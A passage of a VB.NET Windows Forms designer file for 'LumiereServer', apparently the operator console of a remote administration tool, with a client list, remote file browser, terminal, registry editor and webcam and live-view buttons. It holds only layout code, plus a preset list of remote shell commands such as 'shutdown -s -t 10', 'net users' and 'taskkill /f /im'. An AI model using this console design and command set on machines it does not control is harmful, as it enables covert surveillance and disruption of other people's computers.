        Me.Panel7.Name = "Panel7"
        Me.Panel7.Size = New System.Drawing.Size(274, 13)
        Me.Panel7.TabIndex = 29
        '
        'ftpDownloadProgressBar
        '
        Me.ftpDownloadProgressBar.Location = New System.Drawing.Point(-1, -2)
        Me.ftpDownloadProgressBar.Name = "ftpDownloadProgressBar"
        Me.ftpDownloadProgressBar.Size = New System.Drawing.Size(281, 16)
        Me.ftpDownloadProgressBar.Style = MetroFramework.MetroColorStyle.Red
        Me.ftpDownloadProgressBar.TabIndex = 38
        Me.ftpDownloadProgressBar.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.ftpDownloadProgressBar.UseCustomBackColor = True
        '
        'openFileDialog
        '
        Me.openFileDialog.Multiselect = True
        Me.openFileDialog.Title = "Upload File"
        '
        'uploadBackgroundWorker
        '
        Me.uploadBackgroundWorker.WorkerSupportsCancellation = True
        '
        'panelComponentsList
        '
        Me.panelComponentsList.Appearance = System.Windows.Forms.TabAppearance.FlatButtons
        Me.panelComponentsList.Controls.Add(Me.MetroTabPage2)
        Me.panelComponentsList.Controls.Add(Me.MetroTabPage1)
        Me.panelComponentsList.Controls.Add(Me.MetroTabPage3)
        Me.panelComponentsList.Cursor = System.Windows.Forms.Cursors.Arrow
        Me.panelComponentsList.FontWeight = MetroFramework.MetroTabControlWeight.Regular
        Me.panelComponentsList.Location = New System.Drawing.Point(299, 31)
        Me.panelComponentsList.Margin = New System.Windows.Forms.Padding(0)
        Me.panelComponentsList.Name = "panelComponentsList"
        Me.panelComponentsList.SelectedIndex = 0
        Me.panelComponentsList.Size = New System.Drawing.Size(1484, 560)
        Me.panelComponentsList.Style = MetroFramework.MetroColorStyle.Red
        Me.panelComponentsList.TabIndex = 13
        Me.panelComponentsList.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.panelComponentsList.UseSelectable = True
        '
        'MetroTabPage2
        '
        Me.MetroTabPage2.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.MetroTabPage2.Controls.Add(Me.ftpView)
        Me.MetroTabPage2.Controls.Add(Me.ftpOperationHistory)
        Me.MetroTabPage2.Controls.Add(Me.Panel6)
        Me.MetroTabPage2.Controls.Add(Me.Panel4)
        Me.MetroTabPage2.Controls.Add(Me.Panel12)
        Me.MetroTabPage2.HorizontalScrollbarBarColor = True
        Me.MetroTabPage2.HorizontalScrollbarHighlightOnWheel = False
        Me.MetroTabPage2.HorizontalScrollbarSize = 10
        Me.MetroTabPage2.Location = New System.Drawing.Point(4, 41)
        Me.MetroTabPage2.Margin = New System.Windows.Forms.Padding(0)
        Me.MetroTabPage2.Name = "MetroTabPage2"
        Me.MetroTabPage2.Size = New System.Drawing.Size(1476, 515)
        Me.MetroTabPage2.TabIndex = 1
        Me.MetroTabPage2.Text = "File Transfer Protocol"
        Me.MetroTabPage2.Theme = MetroFramework.MetroThemeStyle.Dark
        Me.MetroTabPage2.UseCustomBackColor = True
        Me.MetroTabPage2.VerticalScrollbarBarColor = True
        Me.MetroTabPage2.VerticalScrollbarHighlightOnWheel = False
        Me.MetroTabPage2.VerticalScrollbarSize = 10
        '
        'ftpView
        '
        Me.ftpView.AllowDrop = True
        Me.ftpView.AutoArrange = False
        Me.ftpView.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.ftpView.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.ftpView.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.clmnName, Me.clmnSize, Me.clmnLastWriteTime})
        Me.ftpView.Font = New System.Drawing.Font("Verdana", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ftpView.ForeColor = System.Drawing.Color.White
        Me.ftpView.FullRowSelect = True
        Me.ftpView.HeaderStyle = System.Windows.Forms.ColumnHeaderStyle.None
        Me.ftpView.Location = New System.Drawing.Point(147, 51)
        Me.ftpView.Name = "ftpView"
        Me.ftpView.Size = New System.Drawing.Size(906, 423)
        Me.ftpView.SmallImageList = Me.iconList
        Me.ftpView.TabIndex = 28
        Me.ftpView.TileSize = New System.Drawing.Size(148, 150)
        Me.ftpView.UseCompatibleStateImageBehavior = False
        Me.ftpView.View = System.Windows.Forms.View.Details
        '
        'clmnName
        '
        Me.clmnName.Text = "Name"
        Me.clmnName.Width = 270
        '
        'clmnSize
        '
        Me.clmnSize.Text = "Size"
        '
        'clmnLastWriteTime
        '
        Me.clmnLastWriteTime.Text = "Last Write Time"
        Me.clmnLastWriteTime.Width = 200
        '
        'ftpOperationHistory
        '
        Me.ftpOperationHistory.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.ftpOperationHistory.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.ftpOperationHistory.Dock = System.Windows.Forms.DockStyle.Right
        Me.ftpOperationHistory.Font = New System.Drawing.Font("Verdana", 9.0!)
        Me.ftpOperationHistory.ForeColor = System.Drawing.Color.Gray
        Me.ftpOperationHistory.FormattingEnabled = True
        Me.ftpOperationHistory.ItemHeight = 14
        Me.ftpOperationHistory.Location = New System.Drawing.Point(1078, 47)
        Me.ftpOperationHistory.Margin = New System.Windows.Forms.Padding(10)
        Me.ftpOperationHistory.Name = "ftpOperationHistory"
        Me.ftpOperationHistory.Size = New System.Drawing.Size(398, 430)
        Me.ftpOperationHistory.TabIndex = 37
        '
        'Panel4
        '
        Me.Panel4.BackColor = System.Drawing.Color.Black
        Me.Panel4.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch
        Me.Panel4.Controls.Add(Me.lblActivity)
        Me.Panel4.Controls.Add(Me.lblColumnFtp3)
        Me.Panel4.Controls.Add(Me.ftpUrl)
        Me.Panel4.Controls.Add(Me.lblColumnFtp2)
        Me.Panel4.Controls.Add(Me.lblColumnFtp1)
        Me.Panel4.Dock = System.Windows.Forms.DockStyle.Top
        Me.Panel4.Location = New System.Drawing.Point(147, 0)
        Me.Panel4.Name = "Panel4"
        Me.Panel4.Size = New System.Drawing.Size(1329, 47)
        Me.Panel4.TabIndex = 27
        '
        'lblActivity
        '
        Me.lblActivity.AutoSize = True
        Me.lblActivity.Font = New System.Drawing.Font("Consolas", 9.75!)
        Me.lblActivity.ForeColor = System.Drawing.Color.Gray
        Me.lblActivity.Location = New System.Drawing.Point(926, 26)
        Me.lblActivity.Name = "lblActivity"
        Me.lblActivity.Size = New System.Drawing.Size(63, 15)
        Me.lblActivity.TabIndex = 8
        Me.lblActivity.Text = "Activity"
        '
        'MetroTabPage1
        '
        Me.MetroTabPage1.BackColor = System.Drawing.Color.Black
        Me.MetroTabPage1.Controls.Add(Me.cmdHistoryList)
        Me.MetroTabPage1.Controls.Add(Me.cmd)
        Me.MetroTabPage1.HorizontalScrollbarBarColor = True
        Me.MetroTabPage1.HorizontalScrollbarHighlightOnWheel = False
        Me.MetroTabPage1.HorizontalScrollbarSize = 10
        Me.MetroTabPage1.Location = New System.Drawing.Point(4, 41)
        Me.MetroTabPage1.Name = "MetroTabPage1"
        Me.MetroTabPage1.Size = New System.Drawing.Size(1476, 515)
        Me.MetroTabPage1.TabIndex = 2
        Me.MetroTabPage1.Text = "Terminal"
        Me.MetroTabPage1.UseCustomBackColor = True
        Me.MetroTabPage1.VerticalScrollbarBarColor = True
        Me.MetroTabPage1.VerticalScrollbarHighlightOnWheel = False
        Me.MetroTabPage1.VerticalScrollbarSize = 10
        '
        'cmdHistoryList
        '
        Me.cmdHistoryList.BackColor = System.Drawing.Color.Black
        Me.cmdHistoryList.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.cmdHistoryList.Dock = System.Windows.Forms.DockStyle.Right
        Me.cmdHistoryList.Font = New System.Drawing.Font("Verdana", 9.0!)
        Me.cmdHistoryList.ForeColor = System.Drawing.Color.Gray
        Me.cmdHistoryList.FormattingEnabled = True
        Me.cmdHistoryList.ItemHeight = 14
        Me.cmdHistoryList.Items.AddRange(New Object() {"   dir", "   cd", "   rm", "   shutdown -s -t 10", "   ipconfig", "   net users", "   net stat -an", "   systeminfo", "   tasklist", "   taskkill /f /im"})
        Me.cmdHistoryList.Location = New System.Drawing.Point(1234, 0)
        Me.cmdHistoryList.Margin = New System.Windows.Forms.Padding(3, 50, 3, 3)
        Me.cmdHistoryList.Name = "cmdHistoryList"
        Me.cmdHistoryList.Size = New System.Drawing.Size(242, 515)
        Me.cmdHistoryList.TabIndex = 36
        '
        'MetroTabPage3
        '
        Me.MetroTabPage3.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.MetroTabPage3.Controls.Add(Me.Panel10)
        Me.MetroTabPage3.Controls.Add(Me.regValueHolder)
        Me.MetroTabPage3.Controls.Add(Me.regKeyHolder)
        Me.MetroTabPage3.HorizontalScrollbarBarColor = True
        Me.MetroTabPage3.HorizontalScrollbarHighlightOnWheel = False
        Me.MetroTabPage3.HorizontalScrollbarSize = 10
        Me.MetroTabPage3.Location = New System.Drawing.Point(4, 41)
        Me.MetroTabPage3.Name = "MetroTabPage3"
        Me.MetroTabPage3.Size = New System.Drawing.Size(1476, 515)
        Me.MetroTabPage3.TabIndex = 3
        Me.MetroTabPage3.Text = "Registry Editor"
        Me.MetroTabPage3.UseCustomBackColor = True
        Me.MetroTabPage3.UseCustomForeColor = True
        Me.MetroTabPage3.UseStyleColors = True
        Me.MetroTabPage3.VerticalScrollbarBarColor = True
        Me.MetroTabPage3.VerticalScrollbarHighlightOnWheel = False
        Me.MetroTabPage3.VerticalScrollbarSize = 10
        '
        'Panel10
        '
        Me.Panel10.BackColor = System.Drawing.Color.Black
        Me.Panel10.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch
        Me.Panel10.Controls.Add(Me.Label17)
        Me.Panel10.Controls.Add(Me.Label19)
        Me.Panel10.Controls.Add(Me.Label21)
        Me.Panel10.Controls.Add(Me.Label22)
        Me.Panel10.Dock = System.Windows.Forms.DockStyle.Top
        Me.Panel10.Location = New System.Drawing.Point(0, 0)
        Me.Panel10.Name = "Panel10"
        Me.Panel10.Size = New System.Drawing.Size(1476, 24)
        Me.Panel10.TabIndex = 28
        '
        'Label17
        '
        Me.Label17.AutoSize = True
        Me.Label17.Font = New System.Drawing.Font("Consolas", 9.75!)
        Me.Label17.ForeColor = System.Drawing.Color.Gray
        Me.Label17.Location = New System.Drawing.Point(25, 4)
        Me.Label17.Name = "Label17"
        Me.Label17.Size = New System.Drawing.Size(147, 15)
        Me.Label17.TabIndex = 8
        Me.Label17.Text = "Regedit Entry Viewer"
        '
        'Label19
        '
        Me.Label19.AutoSize = True
        Me.Label19.Font = New System.Drawing.Font("Consolas", 9.75!)
        Me.Label19.ForeColor = System.Drawing.Color.Gray
        Me.Label19.Location = New System.Drawing.Point(1037, 7)
        Me.Label19.Name = "Label19"
        Me.Label19.Size = New System.Drawing.Size(35, 15)
        Me.Label19.TabIndex = 7
        Me.Label19.Text = "Data"
        '
        'Label21
        '
        Me.Label21.AutoSize = True
        Me.Label21.Font = New System.Drawing.Font("Consolas", 9.75!)
        Me.Label21.ForeColor = System.Drawing.Color.Gray
        Me.Label21.Location = New System.Drawing.Point(854, 4)
        Me.Label21.Name = "Label21"
        Me.Label21.Size = New System.Drawing.Size(35, 15)
        Me.Label21.TabIndex = 6
        Me.Label21.Text = "Type"
        '
        'Label22
        '
        Me.Label22.AutoSize = True
        Me.Label22.Font = New System.Drawing.Font("Consolas", 9.75!)
        Me.Label22.ForeColor = System.Drawing.Color.Gray
        Me.Label22.Location = New System.Drawing.Point(547, 4)
        Me.Label22.Name = "Label22"
        Me.Label22.Size = New System.Drawing.Size(35, 15)
        Me.Label22.TabIndex = 5
        Me.Label22.Text = "Name"
        '
        'regValueHolder
        '
        Me.regValueHolder.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.regValueHolder.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.regValueHolder.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.rgClmnName, Me.rgClmnType, Me.rgClmnData})
        Me.regValueHolder.Font = New System.Drawing.Font("Verdana", 9.0!)
        Me.regValueHolder.ForeColor = System.Drawing.Color.White
        Me.regValueHolder.FullRowSelect = True
        Me.regValueHolder.HeaderStyle = System.Windows.Forms.ColumnHeaderStyle.None
        Me.regValueHolder.Location = New System.Drawing.Point(544, 30)
        Me.regValueHolder.Name = "regValueHolder"
        Me.regValueHolder.Size = New System.Drawing.Size(903, 485)
        Me.regValueHolder.SmallImageList = Me.iconList
        Me.regValueHolder.TabIndex = 3
        Me.regValueHolder.UseCompatibleStateImageBehavior = False
        Me.regValueHolder.View = System.Windows.Forms.View.Details
        '
        'rgClmnName
        '
        Me.rgClmnName.Text = "Name"
        Me.rgClmnName.Width = 289
        '
        'rgClmnType
        '
        Me.rgClmnType.Text = "Type"
        Me.rgClmnType.Width = 175
        '
        'rgClmnData
        '
        Me.rgClmnData.Text = "Data"
        Me.rgClmnData.Width = 358
        '
        'regKeyHolder
        '
        Me.regKeyHolder.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.regKeyHolder.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.regKeyHolder.Font = New System.Drawing.Font("Verdana", 9.0!)
        Me.regKeyHolder.ForeColor = System.Drawing.Color.White
        Me.regKeyHolder.FullRowSelect = True
        Me.regKeyHolder.ImageIndex = 0
        Me.regKeyHolder.ImageList = Me.iconList
        Me.regKeyHolder.Location = New System.Drawing.Point(10, 46)
        Me.regKeyHolder.Name = "regKeyHolder"
        Me.regKeyHolder.SelectedImageIndex = 0
        Me.regKeyHolder.Size = New System.Drawing.Size(527, 469)
        Me.regKeyHolder.TabIndex = 2
        '
        'txtEditUserDescriptor
        '
        Me.txtEditUserDescriptor.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.txtEditUserDescriptor.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.txtEditUserDescriptor.Dock = System.Windows.Forms.DockStyle.Fill
        Me.txtEditUserDescriptor.ForeColor = System.Drawing.Color.White
        Me.txtEditUserDescriptor.Location = New System.Drawing.Point(10, 10)
        Me.txtEditUserDescriptor.Multiline = True
        Me.txtEditUserDescriptor.Name = "txtEditUserDescriptor"
        Me.txtEditUserDescriptor.Size = New System.Drawing.Size(194, 206)
        Me.txtEditUserDescriptor.TabIndex = 16
        '
        'panelEditUserDescriptor
        '
        Me.panelEditUserDescriptor.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
        Me.panelEditUserDescriptor.Controls.Add(Me.txtEditUserDescriptor)
        Me.panelEditUserDescriptor.Location = New System.Drawing.Point(385, 829)
        Me.panelEditUserDescriptor.Name = "panelEditUserDescriptor"
        Me.panelEditUserDescriptor.Padding = New System.Windows.Forms.Padding(10)
        Me.panelEditUserDescriptor.Size = New System.Drawing.Size(214, 226)
        Me.panelEditUserDescriptor.TabIndex = 17
        Me.panelEditUserDescriptor.Visible = False
        '
        'regKeyContextMenu
        '
        Me.regKeyContextMenu.BackColor = System.Drawing.Color.FromArgb(CType(CType(38, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(56, Byte), Integer))
        Me.regKeyContextMenu.ImageScalingSize = New System.Drawing.Size(20, 20)
        Me.regKeyContextMenu.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.regBtnKeyRefresh, Me.ToolStripSeparator5, Me.regBtnKeyDelete, Me.ToolStripSeparator6, Me.regBtnKeyNewSubkey})
        Me.regKeyContextMenu.Name = "ftpMenu"
        Me.regKeyContextMenu.RenderMode = System.Windows.Forms.ToolStripRenderMode.System
        Me.regKeyContextMenu.Size = New System.Drawing.Size(139, 82)
        '
        'regBtnKeyRefresh
        '
        Me.regBtnKeyRefresh.ForeColor = System.Drawing.Color.White
        Me.regBtnKeyRefresh.Name = "regBtnKeyRefresh"
        Me.regBtnKeyRefresh.Size = New System.Drawing.Size(138, 22)
        Me.regBtnKeyRefresh.Text = "&Refresh"
        '
        'ToolStripSeparator5
        '
        Me.ToolStripSeparator5.BackColor = System.Drawing.Color.FromArgb(CType(CType(38, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(56, Byte), Integer))
        Me.ToolStripSeparator5.Name = "ToolStripSeparator5"
        Me.ToolStripSeparator5.Size = New System.Drawing.Size(135, 6)
        '
        'regBtnKeyDelete
        '
        Me.regBtnKeyDelete.BackColor = System.Drawing.Color.FromArgb(CType(CType(38, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(56, Byte), Integer))
        Me.regBtnKeyDelete.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text
        Me.regBtnKeyDelete.ForeColor = System.Drawing.Color.White
        Me.regBtnKeyDelete.Name = "regBtnKeyDelete"
        Me.regBtnKeyDelete.Size = New System.Drawing.Size(138, 22)
        Me.regBtnKeyDelete.Text = "Delete"
        '
        'ToolStripSeparator6
        '
        Me.ToolStripSeparator6.Name = "ToolStripSeparator6"
        Me.ToolStripSeparator6.Size = New System.Drawing.Size(135, 6)
        '
        'regBtnKeyNewSubkey
        '
        Me.regBtnKeyNewSubkey.ForeColor = System.Drawing.Color.White
        Me.regBtnKeyNewSubkey.Name = "regBtnKeyNewSubkey"
        Me.regBtnKeyNewSubkey.Size = New System.Drawing.Size(138, 22)
        Me.regBtnKeyNewSubkey.Text = "New subkey"
        '
        'regValueContextMenu
        '
        Me.regValueContextMenu.BackColor = System.Drawing.Color.FromArgb(CType(CType(38, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(56, Byte), Integer))
        Me.regValueContextMenu.ImageScalingSize = New System.Drawing.Size(20, 20)
        Me.regValueContextMenu.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.regBtnValueRefresh, Me.regBtnValueDelete, Me.regBtnValueNewValue})
        Me.regValueContextMenu.Name = "ftpMenu"
        Me.regValueContextMenu.RenderMode = System.Windows.Forms.ToolStripRenderMode.System
        Me.regValueContextMenu.Size = New System.Drawing.Size(130, 70)
        '
        'regBtnValueRefresh
        '
        Me.regBtnValueRefresh.ForeColor = System.Drawing.Color.White
        Me.regBtnValueRefresh.Name = "regBtnValueRefresh"
        Me.regBtnValueRefresh.Size = New System.Drawing.Size(129, 22)
        Me.regBtnValueRefresh.Text = "&Refresh"
        '
        'regBtnValueDelete
        '
        Me.regBtnValueDelete.BackColor = System.Drawing.Color.FromArgb(CType(CType(38, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(56, Byte), Integer))
        Me.regBtnValueDelete.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text
        Me.regBtnValueDelete.ForeColor = System.Drawing.Color.White
        Me.regBtnValueDelete.Name = "regBtnValueDelete"
        Me.regBtnValueDelete.Size = New System.Drawing.Size(129, 22)
        Me.regBtnValueDelete.Text = "Delete"
        '
        'regBtnValueNewValue
        '
        Me.regBtnValueNewValue.ForeColor = System.Drawing.Color.White
        Me.regBtnValueNewValue.Name = "regBtnValueNewValue"
        Me.regBtnValueNewValue.Size = New System.Drawing.Size(129, 22)
        Me.regBtnValueNewValue.Text = "New value"
        '
        'LumiereServer
        '
        Me.AllowDrop = True
        Me.AutoScaleDimensions = New System.Drawing.SizeF(96.0!, 96.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi
        Me.BackColor = System.Drawing.SystemColors.WindowFrame
        Me.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center
        Me.ClientSize = New System.Drawing.Size(1803, 793)
        Me.Controls.Add(Me.panelEditUserDescriptor)
        Me.Controls.Add(Me.panelComponentsList)
        Me.Controls.Add(Me.hiddenPanel)
        Me.Controls.Add(Me.btnUnhideClientsPanel)
        Me.Controls.Add(Me.panelDebugView)
        Me.Controls.Add(Me.Panel2)
        Me.Controls.Add(Me.panelInfoHolder)
        Me.Controls.Add(Me.mMenu)
        Me.Cursor = System.Windows.Forms.Cursors.Arrow
        Me.Font = New System.Drawing.Font("Microsoft Tai Le", 9.75!)
        Me.ForeColor = System.Drawing.Color.Silver
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle
        Me.HelpButton = True
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MainMenuStrip = Me.mMenu
        Me.MaximizeBox = False
        Me.Name = "LumiereServer"
        Me.Text = "LumiereServer"
        Me.panelInfoHolder.ResumeLayout(False)
        Me.panelInfoHolder.PerformLayout()
        Me.Panel3.ResumeLayout(False)
        Me.Panel3.PerformLayout()
        Me.mMenu.ResumeLayout(False)
        Me.mMenu.PerformLayout()
        Me.Panel2.ResumeLayout(False)
        Me.Panel5.ResumeLayout(False)
        Me.Panel5.PerformLayout()
        Me.Panel9.ResumeLayout(False)
        Me.Panel9.PerformLayout()
        Me.shellContextMenu.ResumeLayout(False)
        Me.panelDebugView.ResumeLayout(False)
        Me.TableLayoutPanel1.ResumeLayout(False)
        Me.Panel13.ResumeLayout(False)
        Me.Panel13.PerformLayout()
        Me.hiddenPanel.ResumeLayout(False)
        Me.ftpMenu.ResumeLayout(False)
        Me.ftpMenuEmptyClick.ResumeLayout(False)
        Me.Panel12.ResumeLayout(False)
        Me.Panel12.PerformLayout()
        Me.Panel1.ResumeLayout(False)
        Me.Panel1.PerformLayout()
        Me.Panel14.ResumeLayout(False)
        Me.Panel6.ResumeLayout(False)
        Me.Panel6.PerformLayout()
        Me.Panel8.ResumeLayout(False)
        Me.Panel7.ResumeLayout(False)
        Me.panelComponentsList.ResumeLayout(False)
        Me.MetroTabPage2.ResumeLayout(False)
        Me.Panel4.ResumeLayout(False)
        Me.Panel4.PerformLayout()
        Me.MetroTabPage1.ResumeLayout(False)
        Me.MetroTabPage3.ResumeLayout(False)
        Me.Panel10.ResumeLayout(False)
        Me.Panel10.PerformLayout()
        Me.panelEditUserDescriptor.ResumeLayout(False)
        Me.panelEditUserDescriptor.PerformLayout()
        Me.regKeyContextMenu.ResumeLayout(False)
        Me.regValueContextMenu.ResumeLayout(False)
        CType(Me.listbindingsource, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub

    ''' <summary>
    ''' The listbindingsource
    ''' </summary>
    Friend WithEvents listbindingsource As BindingSource
    ''' <summary>
    ''' The panel information holder
    ''' </summary>
    Friend WithEvents panelInfoHolder As Panel
    ''' <summary>
    ''' The labeluid
    ''' </summary>
    Friend WithEvents labeluid As Label
    ''' <summary>
    ''' The label7
    ''' </summary>
    Friend WithEvents Label7 As Label
    ''' <summary>
    ''' The label6
    ''' </summary>
    Friend WithEvents Label6 As Label
    ''' <summary>
    ''' The label5
    ''' </summary>
    Friend WithEvents Label5 As Label
    ''' <summary>
    ''' The label4
    ''' </summary>
    Friend WithEvents Label4 As Label
    ''' <summary>
    ''' The label3
    ''' </summary>
    Friend WithEvents Label3 As Label
    ''' <summary>
    ''' The labelusername
    ''' </summary>
    Friend WithEvents labelusername As Label
    ''' <summary>
    ''' The m menu
    ''' </summary>
    Friend WithEvents mMenu As MenuStrip
    ''' <summary>
    ''' The file tool strip menu item
    ''' </summary>
    Friend WithEvents FileToolStripMenuItem As ToolStripMenuItem
    ''' <summary>
    ''' The BTN view client logs
    ''' </summary>
    Friend WithEvents btnViewClientLogs As ToolStripMenuItem
    ''' <summary>
    ''' The exit tool strip menu item
    ''' </summary>
    Friend WithEvents ExitToolStripMenuItem As ToolStripMenuItem
    ''' <summary>
    ''' The help tool strip menu item
    ''' </summary>
    Friend WithEvents HelpToolStripMenuItem As ToolStripMenuItem
    ''' <summary>
    ''' The lextra
    ''' </summary>
    Friend WithEvents lextra As TextBox
    ''' <summary>
    ''' The lcustom
    ''' </summary>
    Friend WithEvents lcustom As TextBox
    ''' <summary>
    ''' The luser
    ''' </summary>
    Friend WithEvents luser As TextBox
    ''' <summary>
    ''' The luid
    ''' </summary>
    Friend WithEvents luid As TextBox
    ''' <summary>
    ''' The losver
    ''' </summary>
    Friend WithEvents losver As TextBox
    ''' <summary>
    ''' The lver
    ''' </summary>
    Friend WithEvents lver As TextBox
    ''' <summary>
    ''' The ldesc
    ''' </summary>
    Friend WithEvents ldesc As TextBox
    ''' <summary>
    ''' The panel2
    ''' </summary>
    Friend WithEvents Panel2 As Panel
    ''' <summary>
    ''' The panel5
    ''' </summary>
    Friend WithEvents Panel5 As Panel
    ''' <summary>
    ''' The label10
    ''' </summary>
    Friend WithEvents Label10 As Label
    ''' <summary>
    ''' The panel9
    ''' </summary>
    Friend WithEvents Panel9 As Panel
    ''' <summary>
    ''' The label12
    ''' </summary>
    Friend WithEvents Label12 As Label
    ''' <summary>
    ''' The panel debug view
    ''' </summary>
    Friend WithEvents panelDebugView As Panel
    ''' <summary>
    ''' The panel13
    ''' </summary>
    Friend WithEvents Panel13 As Panel
    ''' <summary>
    ''' The label14
    ''' </summary>
    Friend WithEvents Label14 As Label
    ''' <summary>
    ''' The BTN cam
    ''' </summary>
    Friend WithEvents btnCam As Button
    ''' <summary>
    ''' The BTN ban
    ''' </summary>
    Friend WithEvents btnBan As Button
    ''' <summary>
    ''' The BTN local dir
    ''' </summary>
    Friend WithEvents btnLocalDir As Button
    ''' <summary>
    ''' The BTN live
    ''' </summary>
    Friend WithEvents btnLive As Button
    ''' <summary>
    ''' The ping disabled clients
    ''' </summary>
    Friend WithEvents pingDisabledClients As Timer
    ''' <summary>
    ''' The panel3
    ''' </summary>
    Friend WithEvents Panel3 As Panel
    ''' <summary>
    ''' The label8
    ''' </summary>
    Friend WithEvents Label8 As Label
    ''' <summary>
    ''' The label1
    ''' </summary>
    Friend WithEvents Label1 As Label
    ''' <summary>
    ''' The label9
    ''' </summary>
    Friend WithEvents Label9 As Label
    ''' <summary>
    ''' The statusftp
    ''' </summary>
    Friend WithEvents statusftp As TextBox
    ''' <summary>
    ''' The statusshell
    ''' </summary>
    Friend WithEvents statusshell As TextBox
    ''' <summary>
    ''' The BTN unhide clients panel
    ''' </summary>
    Friend WithEvents btnUnhideClientsPanel As Button
    ''' <summary>
    ''' The hidden panel
    ''' </summary>
    Friend WithEvents hiddenPanel As Panel
    ''' <summary>
    ''' The FTP URL
    ''' </summary>
    Friend WithEvents ftpUrl As TextBox
    ''' <summary>
    ''' The icon list
    ''' </summary>
    Friend WithEvents iconList As ImageList
    ''' <summary>
    ''' The thread list
    ''' </summary>
    Friend WithEvents threadList As ListBox
    ''' <summary>
    ''' The command
    ''' </summary>
    Friend WithEvents cmd As RichTextBox
    ''' <summary>
    ''' The debug view
    ''' </summary>
    Friend WithEvents debugView As RichTextBox
    ''' <summary>
    ''' The FTP menu
    ''' </summary>
    Friend WithEvents ftpMenu As ContextMenuStrip
    ''' <summary>
    ''' The FTP BTN download file
    ''' </summary>
    Friend WithEvents ftpBtnDownloadFile As ToolStripMenuItem
    ''' <summary>
    ''' The FTP BTN delete
    ''' </summary>
    Friend WithEvents ftpBtnDelete As ToolStripMenuItem
    ''' <summary>
    ''' The FTP BTN rename
    ''' </summary>
    Friend WithEvents ftpBtnRename As ToolStripMenuItem
    ''' <summary>
    ''' The FTP menu empty click
    ''' </summary>
    Friend WithEvents ftpMenuEmptyClick As ContextMenuStrip
    ''' <summary>
    ''' The BTN FTP download interrupt
    ''' </summary>
    Friend WithEvents btnFtpDownloadInterrupt As Button
    ''' <summary>
    ''' The client list
    ''' </summary>
    Friend WithEvents clientList As ListBox
    ''' <summary>
    ''' The label column FTP3
    ''' </summary>
    Friend WithEvents lblColumnFtp3 As Label
    ''' <summary>
    ''' The label column FTP2
    ''' </summary>
    Friend WithEvents lblColumnFtp2 As Label
    ''' <summary>
    ''' The label column FTP1
    ''' </summary>
    Friend WithEvents lblColumnFtp1 As Label
    ''' <summary>
    ''' The panel12
    ''' </summary>
    Friend WithEvents Panel12 As Panel
    ''' <summary>
    ''' The panel14
    ''' </summary>
    Friend WithEvents Panel14 As Panel
    ''' <summary>
    ''' The label16
    ''' </summary>
    Friend WithEvents Label16 As Label
    ''' <summary>
    ''' The tool strip separator1
    ''' </summary>
    Friend WithEvents ToolStripSeparator1 As ToolStripSeparator
    ''' <summary>
    ''' The FTP new toolstrip
    ''' </summary>
    Friend WithEvents ftpNewToolstrip As ToolStripMenuItem
    ''' <summary>
    ''' The FTP BTN new folder
    ''' </summary>
    Friend WithEvents ftpBtnNewFolder As ToolStripMenuItem
    ''' <summary>
    ''' The FTP BTN new file
    ''' </summary>
    Friend WithEvents ftpBtnNewFile As ToolStripMenuItem
    ''' <summary>
    ''' The FTP BTN upload
    ''' </summary>
    Friend WithEvents ftpBtnUpload As ToolStripMenuItem
    ''' <summary>
    ''' The open file dialog
    ''' </summary>
    Friend WithEvents openFileDialog As OpenFileDialog
    ''' <summary>
    ''' The BTN shortcut windows
    ''' </summary>
    Friend WithEvents btnShortcutWindows As Button
    ''' <summary>
    ''' The BTN shortcut temporary
    ''' </summary>
    Friend WithEvents btnShortcutTemp As Button
    ''' <summary>
    ''' The BTN shortcut application data
    ''' </summary>
    Friend WithEvents btnShortcutAppData As Button
    ''' <summary>
    ''' The BTN shortcut desktop
    ''' </summary>
    Friend WithEvents btnShortcutDesktop As Button
    ''' <summary>
